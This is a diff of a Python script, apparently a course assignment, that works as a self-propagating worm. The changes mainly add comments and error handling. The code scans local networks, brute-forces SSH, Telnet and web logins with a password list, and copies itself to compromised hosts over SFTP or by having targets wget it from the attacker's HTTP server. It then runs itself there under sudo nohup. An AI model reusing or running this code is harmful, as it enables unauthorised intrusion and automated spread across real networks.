@@ -5,7 +5,7 @@ from scapy.all import *
 from os import path
 from shutil import copyfile, rmtree
 from telnetlib import Telnet
-from paramiko import SSHClient, AutoAddPolicy
+from paramiko import SSHClient, AutoAddPolicy, SSHException, AuthenticationException
 from requests import get, post
 from http.server import HTTPServer, SimpleHTTPRequestHandler
 
@@ -91,6 +91,8 @@ def main():
         print("********** %s **********\n" % ip)
 
 
+# Scans to see if a specified port is open for a specified ip.
+# Return True if open False if closed or no response received
 def scan_port(ip, port):
     pkt = IP(dst=ip) / TCP(dport=port, flags="S")
     ans, unans = sr(pkt, timeout=2)
@@ -100,6 +102,8 @@ def scan_port(ip, port):
         return False
 
 
+# Tries to bruteforce into a specified IP using SSH with a particular username and a list of passwords.
+# Returns "username:password" if successful otherwise an empty string
 def bruteforce_ssh(ip, port, username, passwords):
     print("Attempting bruteforce with SSH")
     response = ""
@@ -110,14 +114,18 @@ def bruteforce_ssh(ip, port, username, passwords):
             client.connect(ip, username=username, password=password, port=port, timeout=3)
             response = "%s:%s" % (username, password)
             break
-        except:
+        except AuthenticationException:
             pass
+        except (SSHException, socket.error):
+            return response
         finally:
             client.close()
 
     return response
 
 
+# Tries to bruteforce into a specified IP using Telnet with a particular username and a list of passwords.
+# Returns "username:password" if successful otherwise an empty string
 def bruteforce_telnet(ip, port, username, passwords):
     print("Attempting bruteforce with Telnet")
     response = ""
@@ -146,6 +154,8 @@ def bruteforce_telnet(ip, port, username, passwords):
     return response
 
 
+# Tries to bruteforce into a specified IPs web application with a particular username and a list of passwords.
+# Returns "username:password" if successful otherwise an empty string
 def bruteforce_web(ip, port, username, passwords):
     print("Attempting bruteforce to Web Server")
     response = ""
@@ -153,8 +163,11 @@ def bruteforce_web(ip, port, username, passwords):
     index_url = "%s/index.php" % base_url
     login_url = "%s/login.php" % base_url
     for password in passwords:
+        # Checks to see if the IP has an index.php file, implying it's a web application
         index_response = get(index_url)
         if index_response.status_code == 200:
+            # Sends a HTTP POST to the application login.php page. Response will have the text 'Welcome' if the
+            # credentials successfully logged in
             login_response = post(login_url, data={"username": username, "password": password})
             if "Welcome" in login_response.text:
                 response = "%s:%s" % (username, password)
@@ -162,6 +175,9 @@ def bruteforce_web(ip, port, username, passwords):
     return response
 
 
+# Reads the contents of a specified file to a list. If the provided file is empty an error message will be provided
+# and the script terminated.
+# Returns file contents in a list
 def read_file_from_list(file):
     with open(file) as reader:
         file_contents_list = reader.read().splitlines()
@@ -173,11 +189,18 @@ def read_file_from_list(file):
     return file_contents_list
 
 
+# Checks if a IP address is reachable by sending out an Echo Ping. The source IP of the request and the timeout
+# are optional. If no source IP is provided then scapy will figure out the source IP. If no timeout is provided
+# then a timeout of 2 is set.
+# Returns True if the IP address replied to the Echo Ping False otherwise
 def is_reachable(dst_ip, src_ip=None, timeout=2):
     ans = sr1(IP(src=src_ip, dst=dst_ip, ttl=64) / ICMP(), timeout=timeout)
     return ans is not None
 
 
+# Transfers a file to a specified IP address with it's known username and password. Based on the port shown to be
+# open the file will be transferred over SFTP or HTTP.
+# Return True if the file(s) were deployed successfully False otherwise
 def transfer_file(ip, username, password, port, self_propagate, deployment_filename, script_filename):
     target_directory = get_target_directory(ip, username)
     try:
@@ -189,10 +212,11 @@ def transfer_file(ip, username, password, port, self_propagate, deployment_filen
         return False
 
     successful = transfer_file_function(ip, username, password, target_directory, self_propagate, deployment_filename,
-                                  script_filename)
+                                        script_filename)
 
     if self_propagate:
-        information_message = "Success! %s started on %s" % (script_filename, ip) if successful else "Self propagation failed\n"
+        information_message = "Success! %s started on %s" % (
+            script_filename, ip) if successful else "Self propagation failed\n"
     else:
         information_message = "File deployment successful!" if successful else "File deployment failed\n"
 
@@ -200,14 +224,19 @@ def transfer_file(ip, username, password, port, self_propagate, deployment_filen
     return successful
 
 
+# Transfers a file using SFTP. Will either deploy a single file if -d option is used otherwise -P and -L is used
+# and the script will deploy itself and it's attached file (password file). If using the self propagation feature and
+# the provided user is found to not have sudo access then the function will terminate.
+# Returns True if the file was successfully transferred (and deployed if self propagation) False otherwise
 def transfer_file_with_sftp(ip, username, password, target_directory, self_propagate, deployment_filename,
                             script_filename):
     information_message = "Attempting self propagation with SFTP..." if self_propagate else "Deploying file with SFTP..."
+    sftp_port = 22
     print(information_message)
     client = SSHClient()
     try:
         client.set_missing_host_key_policy(AutoAddPolicy())
-        client.connect(ip, username=username, password=password)
+        client.connect(ip, username=username, password=password, port=sftp_port)
         with client.open_sftp() as sftp_client:
             local_dir = os.getcwd()
 
@@ -236,7 +265,8 @@ def transfer_file_with_sftp(ip, username, password, target_directory, self_propa
                 sudo_check = "id\n"
                 sudo_check_response = encode_in_ascii("27(sudo)")
 
-                sudo = send_command_over_channel(channel, command=sudo_check, check_output=True, output=sudo_check_response)
+                sudo = send_command_over_channel(channel, command=sudo_check, check_output=True,
+                                                 output=sudo_check_response)
                 if not sudo:
                     return False
 
@@ -244,7 +274,8 @@ def transfer_file_with_sftp(ip, username, password, target_directory, self_propa
                     "cd %s\n" % target_directory,
                     "sudo -S chmod +x %s\n" % script_filename,
                     "%s\n" % password,
-                    "sudo nohup ./%s -u %s -p 22,23 -f %s -L -P >/dev/null 2>&1 &\n" % (script_filename, username, deployment_filename)
+                    "sudo nohup ./%s -u %s -p 22,23 -f %s -L -P >/dev/null 2>&1 &\n" % (
+                        script_filename, username, deployment_filename)
                 ]
 
                 for command in commands:
@@ -260,25 +291,35 @@ def transfer_file_with_sftp(ip, username, password, target_directory, self_propa
         client.close()
 
 
+# Sends a command over the provided channel. If required will check the response to the provided command to see if it
+# is the expected reply.
+# Return True if command successful (and output is expected if required) False otherwise
 def send_command_over_channel(channel, command, check_output=False, output=None):
-    channel.send(command)
+    try:
+        channel.send(command)
 
-    counter = 0
-    while not channel.recv_ready():
-        if counter >= 5:
+        counter = 0
+        while not channel.recv_ready():
+            if counter >= 5:
+                return False
+
+            time.sleep(0.1)
+            counter = counter + 1
+
+        command_response = channel.recv(1024)
+        if check_output and output not in command_response:
             return False
 
         time.sleep(0.1)
-        counter = counter + 1
-
-    command_response = channel.recv(1024)
-    if check_output and output not in command_response:
+        return True
+    except socket.error:
         return False
 
-    time.sleep(0.1)
-    return True
 
-
+# Transfers a file using HTTP. Will either deploy a single file if -d option is used otherwise -P and -L is used
+# and the script will deploy itself and it's attached file (password file). If using the self propagation feature and
+# the provided user is found to not have sudo access then the function will terminate.
+# Returns True if the file was successfully transferred (and deployed if self propagation) False otherwise
 def transfer_file_with_http_server(ip, username, password, target_directory, self_propagate, deployment_filename,
                                    script_filename):
     information_message = "Attempting self propagation with HTTP..." if self_propagate else "Deploying file with HTTP..."
@@ -311,7 +352,7 @@ def transfer_file_with_http_server(ip, username, password, target_directory, sel
         wget_if_not_exists_command % (deployment_filename, server_ip, port_number, deployment_filename))
 
     wget_script_file_command = encode_in_ascii(
-         wget_if_not_exists_command % (script_filename, server_ip, port_number, script_filename))
+        wget_if_not_exists_command % (script_filename, server_ip, port_number, script_filename))
 
     chmod_command = encode_in_ascii("sudo -S chmod +x %s\n" % script_filename)
     sudo_prompt = encode_in_ascii("[sudo] password for %s:" % username)
@@ -357,6 +398,7 @@ def transfer_file_with_http_server(ip, username, password, target_directory, sel
     return True
 
 
+# Return The IP address of the host running the script on the particular interface
 def get_server_ip_from_ip(ip):
     server_ip = ""
 
@@ -371,6 +413,8 @@ def get_server_ip_from_ip(ip):
     return server_ip
 
 
+# Deploys the script and provided deployment file to a HTTP server. Moves these files to a new directory to
+# prevent someone having access to the directory running the script.
 def deploy_file_to_server(file, deployment_filename, script_filename):
     current_directory = os.getcwd()
 
@@ -397,11 +441,13 @@ def deploy_file_to_server(file, deployment_filename, script_filename):
     http_server_thread.start()
 
 
+# Gets a particular parameter from list of arguments that was provided for an argument.
+# Return Parameter if found otherwise will print an error to the command window and terminate
 def get_parameter(arguments, argument):
     index = 0
 
     try:
-        parameter_name = get_parameter_name(argument)
+        parameter_name = get_pretty_argument_name(argument)
         parameter_not_provided_message = "%s missing (%s)" % (parameter_name, argument)
     except KeyError:
         parameter_not_provided_message = "Missing parameter for %s" % argument
@@ -421,7 +467,8 @@ def get_parameter(arguments, argument):
     return parameter
 
 
-def get_parameter_name(parameter):
+# Gets the pretty name for an argument
+def get_pretty_argument_name(argument):
     parameter_name = {
         "-t": "IP address filename",
         "-p": "Ports",
@@ -430,11 +477,13 @@ def get_parameter_name(parameter):
         "-d": "Deployment filename",
         "-L": "Local Scan",
         "-P": "Propagate"
-    }[parameter]
+    }[argument]
 
     return parameter_name
 
 
+# Gets the the provided ports and puts them into a sorted list.
+# Return list of ports
 def get_ports_from_input(ports_input):
     ports = []
     ports_input_split = ports_input.split(",")
@@ -442,22 +491,29 @@ def get_ports_from_input(ports_input):
         if port.isdigit():
             ports.append(int(port))
 
+    if not ports:
+        help("No valid ports provided")
+
     ports.sort()
     return ports
 
 
+# Verifies that a provided file exists. If it doesn't an error will be displayed and the application terminated.
 def verify_file_exists(file):
     if not path.isfile(file):
         print("Could not find file %s" % file)
         exit()
 
 
+# Return The directory to deploy files to. Follows the pattern that 10.0.0.2 => server_1, 10.0.0.3 => server_2
 def get_target_directory(ip, username):
     last_ip_octal = ip[ip.rfind('.') + 1:]
     server_number = int(last_ip_octal) - 1
     return "/home/%s/assign_2/server_%d" % (username, server_number)
 
 
+# Will scan for all active IP addresses across all interfaces the attacker can see
+# Return List of all IP addresses that replied
 def scan_for_active_ips():
     interfaces = get_if_list()
     active_ips = []
@@ -467,20 +523,24 @@ def scan_for_active_ips():
     return active_ips
 
 
+# Gets the IP Address of the interface, extracts the base IP from the interface IP i.e. XXX.YYY.ZZZ. and sends an Echo
+# Request to each possible IP in the /24 Network from 1 to 254 with the base IP i.e XXX.YYY.ZZZ.1 -> XXX.YYY.ZZZ.254.
 def scan_against_interface(interface):
     src_ip = get_if_addr(interface)
     base_ip = src_ip[0: (src_ip.rfind('.') + 1)]
     replies_list = []
 
+    # Calls the send function over 20 threads. The range option will provide the final octet value for the ping request.
     with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
         executor.map(send(src_ip, base_ip, replies_list), range(1, 255))
 
     return replies_list
 
 
+# Returns a reference to send_icmp_request
 def send(src_ip, base_ip, replies_list):
     # Sends an Echo Request to the Networks base IP concatenated with a particular IP for the final octet.
-    # The interface_ip is set in the Echo Request as the source. If an Echo Reply is not received in 4 seconds then the
+    # The src_ip is set in the Echo Request as the source. If an Echo Reply is not received in 4 seconds then the
     # request times out.
     def send_icmp_request(last_ip_octal):
         dst_ip = base_ip + str(last_ip_octal)
@@ -490,10 +550,12 @@ def send(src_ip, base_ip, replies_list):
     return send_icmp_request
 
 
+# Return encoded version of the String in ascii
 def encode_in_ascii(s):
     return s.encode("ascii")
 
 
+# Return The port number of the HTTP Server
 def get_server_port_number():
     return 54325
 
@@ -520,6 +582,7 @@ def get_value(shortcut):
     return value
 
 
+# Will print out example usage when a user input error occurs.
 def help(error_message):
     print("Error: %s\n" % error_message)
     print("Example usage:")
